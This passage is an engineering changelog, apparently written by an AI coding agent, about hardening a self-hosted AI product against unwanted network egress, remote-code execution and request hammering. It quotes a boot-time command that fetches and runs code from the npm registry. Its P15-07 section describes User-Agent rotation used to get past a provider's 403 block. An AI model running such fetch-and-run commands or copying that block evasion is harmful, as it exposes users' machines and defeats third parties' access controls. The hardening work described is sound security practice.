`classify()` only ever receives an extracted URL and the URL pattern excludes braces — the hole was
never open. The regex changed no result and is gone. What actually makes compose scannable is one
`lstrip("- ")`, and the test says so now instead of claiming credit for the regex.

### P16-14 — the bug report you can read before you send it
`573c00d..HEAD`. **Suite 6,466 → 6,493 passing, the same 19 failing.**

People do not report bugs because they do not know what to include and they are afraid of leaking
their own data. In this product the second fear is **correct**: a trace here carries the username
in every file path, the LAN in every endpoint, and often a slice of the message that failed.

So Pantheon writes the report, redacts it, and hands it back as **editable text on the person's own
screen**. Nothing transmits. There is no collector and no place in the endpoint for one; the
"open issue tracker" control is an `<a>` they click, carrying no report.

**Settings are allowlisted, and the measurement is the argument.** Filtering names on
`key|token|secret` across this tree's 71 settings flags three that are not secret and would miss a
credential named `openrouter_thing`. So ~20 feature flags show values; everything else reports only
its shape. A test plants a secret under an innocuous name and asserts it never appears.

**Half the tests assert what survives.** A bundle redacted into mush is not safe, it is useless —
and it fails while still looking like a bug report. Model names, short SHAs, timings, file and line
and the exception message all come through; `127.0.0.1` is exempt, because almost every report about
a local model server names it. Two of the eight mutations are *over*-redaction.

`issue_tracker_url` ships empty. A company running this as their own private stack points it at
their queue, and an empty default is also what keeps the env layer alive.

Also fixed, one commit after it shipped: `fetch-pyodide.py` wrote its own manifest through
`write_text`, which translates newlines per platform — so Linux and Windows produced files 16 bytes
apart. It passed because `.gitattributes` normalises text in the index. Git was covering for the
script, on the one file whose whole job is recording exact bytes (`B27`).

### P16-07 — the last CDN load, and the tightening that needed an addition
`7cb337b..HEAD`. **Suite 6,451 → 6,466 passing, the same 19 failing.**

Pyodide loaded from jsDelivr the moment someone ran a Python block, and **the feature did not
work anyway** — the CSP that let `pyodide.js` through blocked the `.wasm` fetch it makes next. A
request that left the machine and bought nothing.

**13.8 MB vendored: the runtime and the Python standard library, no packages.** `codeRunner.js`
never called `loadPackage`, so nothing else was ever being fetched. `indexURL` mattered as much as
`script.src` — Pyodide resolves the wasm, the stdlib zip and the lock file against it, so
repointing only the script tag would leave three of five files remote while a grep for `jsdelivr`
came back clean.

**Dropping the CDN required adding `'wasm-unsafe-eval'`.** No page with a `script-src` can compile
WebAssembly without it. Removing the host and stopping there would have moved the failure instead
of fixing it: no request leaves, and Python still does not run. `'unsafe-eval'` would also have
worked, and is far wider; there is a test that rejects it.

`cdn.jsdelivr.net` was in `script-src`, `style-src` **and** `font-src`. All three are gone. **The
policy now names no external host at all.**

**One artifact, verified before it is opened.** `scripts/fetch-pyodide.py` takes the npm registry
tarball, checks it against the registry's own `dist.integrity` *before* `tarfile.open` — verifying
after extraction verifies nothing — then checks every extracted file against a pinned hash, and
only then writes. All five were separately confirmed byte-identical to what jsDelivr serves.

The licence checker built one commit earlier refused this commit until Pyodide's MPL-2.0 paperwork
was in it. That is the whole reason it exists.

### P16-18 — the emoji stays; the paperwork was the thing that was wrong
`4f973fa..HEAD`. **Suite 6,441 → 6,451 passing, the same 19 failing.**

The instruction was *"make sure licenses are aligned, we can still use that emoji thing it could
add good personality to the platform"* — so this is an attribution audit, and OpenMoji is not going
anywhere. It found two more gaps and one false statement.

**Two vendor marks, unattributed since the fork baseline.** `static/icons/ollama-mark{,-crop}.png`
and `static/icons/sglang-{mark,logo}.png` are other projects' brand marks, labelling backends in
the Cookbook. A permissive software licence covers a project's **code, not its trademarks**, so
nothing in `licenses/` was ever going to cover them — which is precisely why an audit that looks
for `LICENSE` files walks past a logo. They have a section now: nominative use, no affiliation
claimed, and removable on request.

**`CREDITS.md`'s own summary had gone false.** *"The one copyleft dependency is optional"* named
PyMuPDF while CC BY-SA 4.0 artwork shipped by default two sections below it. A summary gets read
*instead of* the detail, which makes it the one place an omission does damage. It now names both,
and states the aggregation argument nobody had written down: the emoji are a data file the program
reads — §5's aggregate — so CC BY-SA does not reach Pantheon's code and the AGPL does not reach the
artwork. A fork that redraws the glyphs owes share-alike on the glyphs alone.

**The real finding is that none of this was ever checked.** Three gaps, all of them visible to
anyone who compared the tree against `CREDITS.md`, none of them found for months, because nobody
did. `.pantheon/check-licences.py` is that comparison and its inventory is an **allowlist** — an
unlisted file under `static/lib/`, `static/fonts/`, `static/icons/` or `library/` fails the build.
Adding a vendored asset now means writing its licence line, which means having read it. Six rules,
one per way this has actually rotted; in CI beside `check-wiring` and `check-specifiers`.

It caught two of my own mistakes on the way in: an assertion on the string `"Ollama"` that was
already satisfied by a *different* list — one that says outright those projects are not distributed
here — and a broken `licenses/` link inside a sentence explaining that the file does not exist.

### P16-06 — vendoring the emoji found a licence nobody had met
`4b29678..HEAD`. **Suite 6,427 → 6,439 passing, the same 19 failing.**

The emoji route fetched from the OpenMoji CDN on first use. Same-origin from the browser's side —
that part was designed carefully — but the **server** reached a third party on roughly the first
assistant reply, because models emit emoji constantly.

**Vendored as one 5 MB JSON, not 4,147 files.** The same bytes cost 18 MB on disk as separate
files; a single blob is kinder to git and to the filesystem. Each entry holds only the inner
markup, because every glyph in this set repeats the same six stroke attributes — hoisted onto one
wrapping `<g>` at serve time, which is most of the 7.6 MB → 5.0 MB saving. It loads lazily, so an
install that never renders an emoji never pays the memory.

**And OpenMoji is CC BY-SA 4.0, credited nowhere.** Not in `CREDITS.md`, not in `NOTICE`, not in
`licenses/`. The product had been serving its artwork since before the fork. Attribution is
required whether the bytes are proxied or bundled — vendoring only made the omission easy to see.
Given how carefully `P0` handled the AGPL and MIT obligations, **this one being absent is the
finding**, not a footnote to the egress fix. Share-alike also reaches what we did to it: stripping
the wrappers is an adaptation, so the vendored file is CC BY-SA 4.0 too, and the manifest says so.

**Two existing tests pinned the disk cache the CDN fetch filled**, so they went red. Rewritten
rather than deleted: the source changed, the property did not — an SVG leaving that route carries
every header that keeps it inert, and unsafe content blanks. The second is now checked on the
*trusted* path too, because a guard that only runs where you expect trouble is one you have
already argued yourself out of. Two more cases came free while I was in there: an unknown
codepoint, and a traversal-shaped code that must never reach the library at all.

**And one of my own tests passed alone and failed in the sweep** — `get_event_loop()` reaching for
a loop another test had already closed. `asyncio.run`. That is the same test-order pollution this
project has paid for before, and it is why the full suite runs before every ship rather than the
file I just touched.

**Three mutations survived first time and all three were my tests.** The CDN check required
`httpx` and a call on the *same line*, so a two-line reintroduction walked through. The sanitiser
test called `_is_safe_svg` directly rather than checking the **handler** uses it — so a handler
that ignored the result passed. And the attribution check matched the substring `OpenMoji`, which
`OpenMojiX` also contains. The first of those also exposed real dead code: the `httpx` import and
the CDN constant were still sitting in the module.

### P16-08 — the proxy was not the fix
`b233bd0..HEAD`. **Suite 6,412 → 6,427 passing, the same 19 failing.**

`img-src` allowed any `https:` host, so an `![](…)` in model output, a RAG document or an
**email** made the reader's browser fetch from a host nobody chose — announcing their IP, their
user-agent and the moment they opened it. That is what a tracking pixel is, and mail is full of
them.

**The obvious fix is a same-origin proxy, and it is only half.** Routing the fetch through the
server protects the browser and dedupes the request — but it still leaves the machine, for content
nobody chose. Under `Law 16` that is the same defect one hop further away. So **the default is
`ask`**: a remote image renders as a control naming its host, and nothing leaves until someone
clicks. `proxy` and `block` are the other two answers.

`/api/img` is deliberately suspicious of what it gets back: session required, SSRF-guarded and
DNS-pinned through `outbound_fetch`, paced by the `P15` limiter, size-capped, `image/*` only,
**`image/svg+xml` refused** — SVG executes, and this path serves bytes a stranger chose to a
logged-in origin — and cached on disk by URL hash.

**Both CSP blocks were tightened, not one.** The app's and the report pages'. There is a test that
counts them, because tightening one and missing the other leaves the hole open and looks fixed.

**`P1-01`'s counting tests went red, correctly.** The placeholder's focus ring is one more
`var(--accent, var(--red))`, so 553 became 554 and the resolved total 562 became 563. Those tests
exist to catch exactly this and their failure message says what to do: *"move this number and say
which site in the commit — do not widen the assertion."* Moved, in all five places that quote it,
and the site is named. That is a counting guard earning its keep on the first unrelated change to
touch the stylesheet since it was written.

**And one mutation found a real gap in my tests.** They asserted the placeholder was *present* and
never that the raw URL was *absent* — so a renderer emitting **both** a plain `<img src=rawUrl>`
and the button passed clean. The CSP would have caught it in a browser, which is exactly the
second layer that hides a first-layer regression. The test now counts how many times the
un-proxied URL can reach an `src`: once, on the same-origin path.

### P16-17 and P16-09 — the report nobody read, and the button that ran a stranger's code
`81200ee..HEAD`. **Suite 6,406 → 6,412 passing, the same 19 failing.**

**`P16-17`** — `/api/diagnostics/services` probes five subsystems, is admin-gated and safe to
poll, and had **no frontend caller at all**. It now renders in the panel `P16-15` built, *after*
the state checks. That order is the argument: something can be perfectly reachable and still
quietly broken, and the reverse is obvious the moment you try to use it. Only non-`ok` services
show — a wall of green teaches people to stop reading. The liveness fetch is wrapped so a failing
probe cannot blank the state checks beside it.

**`P16-09`** — the *remove background* button ran `trust_remote_code=True`, which downloads Python
from a model repository and **executes it**, in the app process, with the app's permissions, on an
ordinary user click, with nothing on screen saying so. Removed under `Law 1`. Nothing opt-in was
lost — the path only ran when rembg was absent, and the error already said how to install it; it
now also says why Pantheon stopped short rather than fetching.

**And my own row was wrong about the scope.** It said *"the one place in the tree"*.
`scripts/diffusion_server.py` passes `trust_remote_code=True` **five more times**, and is
deliberately left alone: an operator who starts a diffusion server has chosen to load models, most
diffusion pipelines require remote code, and loading models is that script's whole purpose. It is
not the app's, and the app is where a user clicks buttons. The distinction is now written where
the deleted code was, and a test fails if it stops being written down — an unexplained exclusion
is how a scoped hole becomes an open one.

### P16-15 — liveness said green for a year
`770f825..HEAD`. **Suite 6,392 → 6,406 passing, the same 19 failing.**

`service_health.py` already answered *can I reach X*. That is liveness, and it is not the
question that matters. **When a year of agent-written email sat staged and invisible, the mail
server was reachable the entire time.** Nothing was down; something had stopped *finishing*, and
no surface counted it. So `src/self_checks.py` asks the other question — *is something
accumulating, or has something quietly stopped* — and puts the answer in front of a person.

Four checks, all local and cheap: staged agent mail with the age of the oldest (`H01`), hosts the
outbound limiter is holding off, embedding lanes unavailable so memory and knowledge search
silently return nothing, and background follow-ups that have given up. **Three of the four give a
reader to something that had none** — `P15-11`'s `snapshot()`, `P15-12`'s per-account mail
backoff, `P16-05`'s degraded lanes. Pointed at this container it immediately reported a real
`stuck`: no embedding lane.

**Two rules the panel enforces on itself.** Every check that can report `stuck` must carry an
`action`, with a test that fails if one cannot — a dot that goes red and offers nothing costs
attention and returns none. And `unknown` never rolls up as `ok`, because *the check could not
run* and *nothing is wrong* are different answers.

It renders **above** the log console, deliberately: the lesson of `H01` is that nobody reads a log
to find a problem they do not know they have. Built with DOM calls rather than `innerHTML` —
this is the one surface whose whole job is reporting trouble, which makes it the likeliest to be
handed a hostile string from a mail subject or a host name.

**Three mutations survived first time and all three were my tests, not the code.** A rollup test
with a single check never exercised the ordering, so ranking `unknown` below `ok` went unnoticed.
A caller test counted `loadSelfChecks()` including its own definition, so it passed with every
call site deleted. And an admin-gate test read a fixed 1,200-character window that reached into
the next route's `require_admin`.

**And building it found another one:** `/api/diagnostics/services` — the liveness report itself —
has no frontend caller at all. Same family as the `H` rows, in the diagnostics surface, which is a
particularly poor place for it. Filed as `P16-17`; the panel just built is its obvious host.

### P16-11 — stop reading, make the machine try
`f65b5cb..HEAD`. **Suite 6,382 → 6,392 passing, the same 19 failing.** `P16` now has a tripwire.

Every finding in this phase was found by a person reading code. That works once and does not
hold: the next convenience default will look as reasonable as `npx -y @playwright/mcp@latest`
did, and its comment will explain the choice just as plainly. So the guard is a **runnable test**
rather than a CI-only job — it fails on a developer's machine, before the push — wired into CI as
`law16-egress` beside the wiring ratchet.

**It sits at `socket.connect` and `getaddrinfo`, not at `httpx`.** Guarding the HTTP library
would have missed `urllib`; guarding both would have missed `subprocess` → `npx`, and the npm
fetch was the worst offender of the lot. Everything reaches a socket eventually.

**The classifier is `not ip.is_global`, and the first version was wrong in the dangerous
direction.** It enumerated loopback, private and link-local — which calls **Tailscale egress**,
because tailnet addresses live in `100.64.0.0/10`, RFC 6598 shared space, where `is_private` is
False. A guard that fires on the product reaching a model server over Tailscale is a guard that
gets switched off. My own test for "not so strict it bans the LAN" caught it.

**And the mutation run found the guard is two independent layers.** Blunt DNS and connect catches
it; blunt connect and DNS catches it; only blunting both goes red. Correct — and it meant the
combined test could prove neither half alive. Each is now exercised on a path the other cannot
reach: a raw `sock.connect` to a literal IP for one, a bare `getaddrinfo` for the other. That
first attempt failed, usefully: `create_connection` calls `getaddrinfo` **even for a literal IP**,
so the DNS guard fired first and the connect guard was never reached.

**The telemetry question closed the same day** (`D-2026-09-01-01`). The owner will be the product's
heaviest user, so he is the sensor — and a better one than a crash-rate curve, because he sees
the bug *and* knows what he was doing when it happened, which is the half telemetry never
captures. That re-ranks the phase: `P16-15` (local self-checks) is now its highest-value row,
because if the maintainer is the instrument, the instrument needs a dial.

### P16-05 — the fallback that always ran
`2dc908a..HEAD`. **Suite 6,374 → 6,382 passing, the same 19 failing.** The last
zero-configuration leak is closed.

`build_embedding_lanes` returns lanes in preference order — a local HTTP embedding server, then
fastembed. `embeddings.py` calls fastembed the *"zero config fallback"*. It was built
**unconditionally**: the `try` around it was never conditional on the primary succeeding. And
`FastEmbedClient.__init__` fetches ~90 MB of ONNX from HuggingFace when the model is absent,
with `fastembed` a hard requirement so the path is never skipped. **A fresh install downloaded a
model from a third party on its first chat message — with a local embedding server running and
answering.** A fallback that always runs is not a fallback.

Three cases now, and only the third reaches the network: cached → use it, free; a working local
lane → do not fetch a second one nobody asked for; nothing else *and* permission → fetch, because
the alternative is silently having no embeddings at all.

**The cache probe deliberately looks for the `.onnx` on disk rather than asking fastembed**,
because fastembed's way of answering *is it there* is to fetch it. That regression would still
return the right answer, which is what makes it invisible — so there is a tripwire test that
constructs a fake `TextEmbedding` and fails if the probe ever touches it.

**I put the gate in the wrong place first, and the suite said so — 14 red.** Those tests stub the
client builder to exercise lane mechanics, so gating the *assembler* refused lanes in tests that
were never going to download anything. The gate belongs at the one function that reaches the
network, not where the lane list is assembled. My own tests moved with it: they now stub
`FastEmbedClient` — the thing that downloads — rather than the function containing the gate,
which had been testing nothing.

**Two rows came out of the telemetry conversation rather than the code.** The owner's real
problem is *"having people report bugs is not very easy to get to happen"*, and the usual answer —
open a pipe — treats the symptom. `P16-14`: people do not report bugs because they do not know
what to include and fear leaking data, and **in this product that fear is correct** — a stack
trace here carries usernames, LAN topology and often the message that caused it. A diagnostic
bundle they can read in full before it goes anywhere removes both obstacles, needs no collector,
and creates no data-controller obligation. `P16-15`: aggregate signal exists to reveal *silent*
failure, and `H01` is the proof it can be got locally — every agent-composed email since install,
staged and invisible for a year, would have been caught in a week by a local check that counted
the queue and put the number in front of the user.

### Law 16, amended — the address is the test, not the activity
Same day, and it turned a restriction into a specification. `3166798..HEAD`. **Suite 6,371 →
6,375 passing, the same 19 failing.**

The owner, hours after `Law 16` landed:

> *"telemetry is fine, but 'phone home' to an external destination is not allowed. if the user
> wants to establish their own telemetry endpoint, they can bypass this law and do so… like
> Prometheus or Grafana etc.. maybe even enrolling other services to connect like OpenSEO, or
> other CRM products"*

**Every question of the form *is X allowed?* is now rewritten as *who owns the address at the
other end?*** If it is the user or their sysadmin, it was always allowed. If it is us, or a
vendor, or anyone they did not name, it is forbidden however anonymous or aggregated.

**This matters because the obvious misreading is wrong in both directions.** *"No telemetry, we
are privacy-first"* is what an agent reaches for, and it would ban the operator's own Grafana —
which the owner explicitly wants — while leaving someone running Pantheon on their own hardware
with no way to see what it is doing, which is `Law 15` failing in a different costume. The same
misreading would *wave through* "anonymous aggregated usage stats" to a vendor, because that
phrasing avoids the word. The address test gets both right and needs no judgement call.

**It also converts the law from a thing to obey into a thing to build.** `P16-12` is now filed:
Pantheon has **no telemetry export at all**, which is compliant by accident rather than by
design. A Prometheus scrape endpoint and an OTLP exporter, with `P14-01`'s local events table as
the source and **no default destination** — because an empty destination here is not a disabled
feature, it is the only correct shipped state.

**`P16-13` arms the guard before the hole exists.** `P16-12` will create the first legitimate
place in this codebase for an outbound metrics URL, and therefore the first place a well-meant
default could land. The test is already red for a compiled-in Sentry DSN, a PostHog beacon in the
frontend, or any telemetry setting that ships pre-filled — checked across 24 collector hosts, in
Python and in JS. Five mutations, all caught.

**The cost is written down rather than glossed** (`D-2026-08-31-01`): nobody upstream will ever
know how Pantheon is used. No crash-rate signal, no adoption data, no way to learn a feature is
broken for everyone except by being told. Paid on purpose — the one thing someone running this
on their own machine is buying is that it does not report on them.

### Law 16, and 286 skills that need no network
`417c91c..HEAD`. **Suite 6,349 → 6,381 passing, the same 19 failing.** New phase `P16`, four rows
closed on the day it opened.

**The owner set a standing constraint:** fully self-hosted by default, nothing routes anywhere
until a person or sysadmin links it — and a linked provider then gets *everything their
subscription allows*. That second clause matters as much as the first: this is a rule about
defaults, not a cap on capability, and nerfing a configured provider in its name is the mistake
`P2` exists to undo. It is `Law 16` now, with the owner's words on it.

**The audit says the product was already most of the way there** — no telemetry of any kind, every
model, embedding and search endpoint defaulting to loopback, `.env.example` two active lines and
both localhost, fonts and libraries vendored, invasive scheduled tasks shipping paused. What was
left were convenience defaults, and the sharpest one is worth naming: **`npx -y
@playwright/mcp@latest` ran about three seconds after every boot**, installing from the npm
registry on first start and re-checking the dist-tag on every one after. A fresh install with no
account and no key reached the public internet before anyone had clicked anything. Its opt-out
existed and was **inverted** — and the comment above it explained the choice plainly, so nobody
had hidden it. It had simply never been asked this question. Alongside it, `search_fallback_chain`
shipped as `["duckduckgo"]` on the reasoning that it is free and keyless, which meant that on a
native install — where SearXNG never starts — **every search a user typed left the machine**.

**And the product now ships 286 skills.** ECC (MIT) vendored under `library/ecc/`, pinned to
`2.2.0` @ `005eff4`. The reason it fits in an afternoon is that nothing needed converting: ECC
writes `name:`/`description:` frontmatter in `SKILL.md`, which is exactly what
`skill_format.py` already reads. All 286 parse with the reader that was already there.

**Three design calls worth the record.** It loads as a **read-only layer beneath** `data/skills/`
rather than seeding copies into it — `data/` is disposable here, and seeding would make every
update a three-way merge against files the user may have edited, where a shadowing layer has no
merge at all. It is kept **off every write path**, because `_iter_skill_files` has three callers
and one of them *rewrites* every file it is handed; folding the library in would have rewritten
286 vendored files in place on the next owner backfill, visible only as a dirty tree. And
**SKILL.md text only** — no upstream scripts or assets, because a product built to depend on
nothing external should not ship code it has not read to run on someone's machine.

**Updatable, not auto-updating.** `scripts/update-skill-library.py` fetches through the `P15`
limiter, **refuses to apply if any incoming skill fails to parse with this product's own reader**,
and regenerates the manifest with per-file checksums so the diff is reviewable. An auto-updating
bundle is an external dependency wearing a different hat, and it turns *review the diff* into
*hope upstream is fine*.

### P15-07 — I overstated my own row, and the scope changes the decision
Pacing landed; the policy question is now correctly framed and belongs to the owner.

`P15-07` read: *"rotates its User-Agent through six vendors' clients to defeat a 403 — block
evasion by construction."* Every word of that is true and it **omitted the scope**, which is the
same failure I spent the previous run correcting in the `H` rows. `_is_kimi_code_url` gates the
whole path to **kimi.com with `/coding` in the path** — a subscription endpoint the operator pays
for. It never touches another provider. Moonshot serves that endpoint only to clients naming
themselves as one of a whitelist of coding agents; Pantheon is a coding agent not on the list. And
the first accepted name is cached per base URL, so the rotation runs once per endpoint, not once
per request.

**The half that needed no decision is done.** The retries went out back to back with no delay —
six rapid re-sends at a host that has just refused you is the shape that escalates, whatever one
concludes about the names. They are paced through the limiter now, and the facts above sit in a
comment over the list so the decision is made on them rather than on my summary of them.

**Marked `[~]`, blocked on the owner.** Not on an agent. Removing the list breaks Kimi Code
subscription support for whoever is using it, so it is a trade, not a cleanup.

### P15-12 — the mailbox that must not be retried was the only one always retried
`38931c6..HEAD`. **Suite 6,339 → 6,349 passing, the same 19 failing.**

`/unread-state` is index-first *specifically* so polling does not hit the provider — its own
docstring says so, and says the fallback happens once. The guard was `if indexed_total:`, and
**the account most likely to have an empty index is the one whose IMAP is failing**, because a
failing account never indexes. So the single mailbox that must not be hammered was the only one
that always was: a live login attempt every 60 seconds, in every open tab, indefinitely.
Repeated failing logins are what providers lock accounts for.

**I wrote the wrong fix first, and it would have shipped.** Wrapping the call in `try/except`
and backing off in the handler is the obvious move — and `_list_emails_sync` **catches every
exception** and reports failure as an `error` key on an otherwise-empty result. AST-verified:
two broad handlers, both returning, neither re-raising. So the handler never runs and the
backoff engages never. It compiles, it reads correctly, and it does nothing.

**That swallowing is also why nobody noticed the hammering.** From the poll's side, a mailbox
that has been refusing logins for a week is indistinguishable from one with no unread mail.
`P3-17` is the row that owns 250 of these; this is the first one that cost something.

**New primitive: `penalise()` / `succeeded()`** — escalating cooldowns for protocols with no
429. IMAP, SMTP, CalDAV: *stop* arrives as a socket error or an auth rejection, so the protocols
without a status code are exactly the ones where blind retrying costs the user most. Keyed by
account rather than host, deliberately — one stale password must not silence the other mailboxes.

**Two mutations survived, and both were my tests.** One asserted `second > first`, which the 20%
jitter satisfies about half the time with escalation deleted entirely — flaky *and* vacuous. The
other checked only that an unrelated account stayed clear, which passes trivially when the
penalty is written to the wrong key and *nothing* is blocked, including the failing account.

### P15-05 — 260 requests from one button, and the error handler made it worse
`d2eb00a..HEAD`. **Suite 6,330 → 6,339 passing, the same 19 failing.**

The hardware-fit catalogue refresh walked 13 collection sources × 20 pages at
huggingface.co — **sequential, no delay, no token** — while two other call sites in this same
product send a Bearer token to that exact host. Now: a **shared** 40-request budget across the
whole refresh (per-source caps alone do not help — thirteen sources each stopping politely at
their own limit still add up to a burst), the token that was two imports away, and a five-minute
floor under `force=True`, which previously walked straight past the 24-hour TTL from a UI button.

**The error handler was the real find.** `except Exception: continue` meant a 429 on the first
source was swallowed and answered by trying the other twelve — so being told to stop bought the
host twelve more bursts. That is the same shape as the search chain in `P15-04`, in a module
nobody connected to it.

**And one mutation survived, usefully.** Deleting the rate-limit `break` changed nothing, because
the limiter's own cooldown already blocks the second source. Two independent protections, which
is correct — but it meant the test could not see the loop it claimed to test. There is now a
second test with a deaf limiter stubbed in, so each half is proved alone.

### P15 — the product had no brakes on anything it called
Four rows closed the day the phase was opened. `ba8f561..HEAD`. **Suite 6,287 → 6,330
passing, the same 19 failing and all 19 pre-existing.**

**This came from the owner getting soft-banned by GitHub**, mid-session, for pasting a link
into his own product's skill importer. The importer walked a repository tree unauthenticated,
at wire speed, opening a fresh TLS connection per file, identifying itself as `python-httpx`.
That is not a feature with a bug in it — that is the exact request shape abuse detection is
built to catch, and it caught it.

**Two audits found the same thing everywhere, and both facts are one-liners.** *Nothing in
this codebase read `Retry-After`* — not one call site out of 50 modules that make outbound
requests. And *nothing had jitter*, so every install fires at the same instant on the same
boundary. `src/rate_limiter.py` did exist, and is **inbound**: it protects Pantheon from its
callers. Nothing protected the user from the services Pantheon calls for them.

**The fix is one shared limiter keyed by destination host, not by feature** — because two
features each staying under a limit will jointly exceed it, and the importer and the
cookbook's GitHub calls could already collide. Its shape is lifted from `routes/device_flow.py`,
which turned out to be the only correct outbound throttle in the tree: a `next_poll_at` per key
and a `slow_down()` that obeys the server's own pacing signal. Re-keying that from poll session
to host was the smallest change that made it apply to everything.

**Hearing "stop" correctly is the part that matters, and it has three forms.** A `429` is the
easy one. **GitHub's primary rate limit is a `403`**, carrying `X-RateLimit-Reset` rather than
`Retry-After` — a client reading only `Retry-After` learns nothing from the response that
matters most. And `X-RateLimit-Remaining: 0` on an otherwise successful response is the only
signal that lets you stop *before* being told to. A plain `403` is not a rate limit and must
not silence a host for an hour; there is a test for that too, because getting it wrong turns
one private repository into a twenty-minute outage.

**The importer's cap was counting the wrong thing.** `MAX_FILES = 64` counts files *kept*. A
directory costs a request whether or not it yields a file, so a tree of empty or binary-only
folders cost an unbounded number of `api.github.com` calls while the counter never moved — and
unauthenticated GitHub allows sixty requests an hour, total. There is now a budget on requests.
There is also a token setting, which is the difference between a couple of imports an hour and
five thousand; and the 403 message now names the wait instead of saying *"try again in a bit"*,
which is the sentence that makes a person click again and deepen the ban.

**Three hammers stopped.** Search retried a rate-limited provider **immediately, with no
sleep**, then walked down the chain doing the same to the next — turning one provider's limit
into load on all of them. `llm_core` retried a 429 on a flat 0.5 seconds, three times, without
reading the header that said when. And `bg_monitor` retried a failed follow-up **every five
seconds, forever** — 720 attempts an hour, each allowed twelve model rounds, each round able to
call `web_search`, entirely unattended.

**Two of my own tests were wrong and the mutation run is what said so.** The jitter test
measured wall-clock time around `acquire`, and scheduler noise alone made the gaps differ — it
passed with jitter switched off entirely; it now reads the *planned* gap and has a control that
proves it can tell the two cases apart. The escalation test called `reset()` in its own setup,
which cleared the counter the assertion was checking, so it passed with the clearing logic
deleted. Both were caught by mutating the thing they claimed to test, which is the only way
either would ever have been caught.

**And one production bug came out of writing them:** `Retry-After: 0` is a legal answer meaning
*go ahead now*, and `parse_retry_after(...) or parse_reset_header(...)` reads `0.0` as absent —
so the clearest instruction a server can give was being converted into the sixty-second penalty
reserved for servers that said nothing at all. It was in three files. The `or` looked right in
all three.

### The reconciliation — the checker was green over six wrong rows
Five read-only agents across all 335 rows; two bumps, four unblocks, one tick withdrawn, nine
dedupes, six premises corrected, two new bugs. `505cd6d..HEAD`. **Suite unchanged — no product
code was touched. Tracker green for the first time on every row.**

**The tracker's own checker had a hole, and it was shaped exactly like the thing it was meant to
catch.** `ROW`'s Blocked group was a bare `(\d+)` while the Done group accepted `**bold**`. The
table bolds a count worth the eye — so **every row with a blocked task failed to match and was
silently skipped**. Seven of fifteen phases: P0, P1, P2, P3, P7, P8, P11 — *exactly* the seven
containing all eleven blocked rows. **Six of the seven were wrong.** P0's table said 16 ready /
13 done where the ticks said 8 / 24. The checker had reported `tracker OK` over that for days,
and three of the five agents found it independently. Fixed with one character class, plus the
rule that mattered more: **a line that names a phase and will not parse is now reported, never
skipped.** The Total row got the same treatment — nothing had ever checked that it added up, and
it had quietly accumulated **27 appended copies of itself** on one line.

**Then the test found a third one in the same file.** `tests/test_check_tracker_guard.py` bends
the tracker in each way it has actually drifted and asserts the checker notices — and one bend
came back green: a task filed under the wrong phase (the `P3-16`/`P5-16` collision, which has
happened here) was *printed* as a `FAIL` line and then exited **0**, so CI passed over it.
Reporting a fault you do not fail on is the same silence as not looking. All three defects are
one habit, which is why the fix is a test and not three patches: **the checker now has ten
mutations it must fail, and the proof lives in the suite instead of in a transcript.**

**`P6-08`'s tick is withdrawn — it was ticked on code as written, not as executed.** The trace
claimed the cap *"resolves through instance setting → env → built-in default … without a
restart."* Both load-bearing clauses are false. The env leg is unreachable at import on a fresh
install (`get_setting` merges `DEFAULT_SETTINGS` on every read, so `get_setting(k, None)` cannot
return `None` — `H06` holds the proof), and `_refresh_concurrency_cap` has exactly one caller,
inside start-up, so nothing re-reads it. The registration and the clamp were real and stand.
`B20`, which described this as dying on the first settings save, is corrected: it dies earlier
and the fix it implies would not have worked.

**Two rows were already done before anyone opened them.** `P2-26` asked for documentation that
exists and **predates the fork** — the blocklist tuples verified byte-identical to baseline
`b4d1293`. `P9-04` had been reduced to a deletion, and the deletion was never valid: `eaf-*` is
the **live** email-account form (provider picker, IMAP/SMTP auto-fill, OAuth), and `set-email-*`
is live too. Both read as dead because the consolidation *moved* them. Under `Law 1` a deletion
is justified before it runs, and that is what caught it.

**Four rows were blocked on nothing.** `P3-19` and `P2-13` had each discharged their own blocker
in their own text and never flipped the mark. `P1-06` was blocked for want of a scope that `B22`
had since supplied. `P7-11` was one `[~]` over two halves — the export UI, ready; the approval
trail, unbuildable because approvals are in-memory with a 600-second TTL — now split so the ready
half can be picked up. **`P11-09` stays blocked and is the one that was right to be.**

**Four `H` rows were wrong, and one was dangerous.** `H21` proposed deleting a 282-line span
containing `_checkPeekCleanup`, which has a live caller **outside** it, and a class-name sweep
that is `P3-03`'s exact blocker — `P3-03` is blocked *because* that sweep deletes the CSS `P2-20`
needs. Struck. `H12` claimed you can never see your compare results; a Scoreboard exists and is
reachable — the real defect is narrower and better: the server record is **write-only** and the
visible history is per-browser, so the two copies drift and neither is authoritative. `H13` cited
the album Set instead of the image Set, which makes the row *cheaper* — `_selectedIds()` already
produces the array the endpoint wants and already drives a live bulk bar. `H11` overstated twice.

**Two new bugs, both found by checking a claim rather than reading code.** `CHANGELOG.md:37`
tells the public the AGPL §13 source link shipped; `P0-17` is open and calls it *"the one licence
obligation that is genuinely required and genuinely missing"* (`B25`). And the sidebar anti-flash
guard was renamed on one side only — the pre-paint script sets `pan-sidebar-*`, the stylesheet
still selects `html.ody-sidebar-*`, so the guard does nothing and every cold load flashes on
exactly the two layouts it was written to protect (`B26`).

**`H01`'s open question is answered: it is a year, not a week.** `agent_email_confirm: True`
arrived at the fork baseline and is in upstream too, so the invisible email backlog is as old as
the install — and the drafts already staged need a way out, not just a switch that stops making
more.

**What this run is really about.** A tracker that reports green while six of its rows are wrong is
worse than no tracker, because it is trusted. Every number I would have written this run would
have gone unvalidated into a table nobody could check. Three agents finding the same regex hole
independently is the part worth keeping: the defect was not hidden, it was *unlooked-at*, and the
thing that finds those is a second reader with no stake in the first one being right.

### The discovery audit — 21 features that exist and cannot be reached
Four read-only audits, five fixes, 21 new `H` rows. `65054fa..HEAD`. **Suite 6,301 collected,
6,277 passing, the same 19 failing and all 19 pre-existing.**

**This run came from one sentence.** The owner, about his own product: *"there's a lot of hidden
things that are in this platform that we can't fully discover yet."* Four agents swept the
backend, the frontend, the configuration surface, and every place the product *claims* a
capability. **Two of them independently found the same two defects**, which is the strongest
evidence in the set.

**The territory was bigger than any document said.** 500 routes, not the 301 in `routes/*.py` —
**173 live in subdirectories** a naive scan omits, and three of the best findings are in that
half. 168 JS modules, not 145. 128 environment variables read, 54 declared.

**Ranked by harm, the product lying to the model comes first**, because the model repeats it to a
person as fact. Three of those:

- **`ui_control open_panel skills` and `open_panel settings` returned "Opening skills panel" and
  did nothing.** The two element ids they clicked **exist nowhere in the repository** — the only
  occurrence of either string was that line. And the system prompt steers *towards* it: *"'open
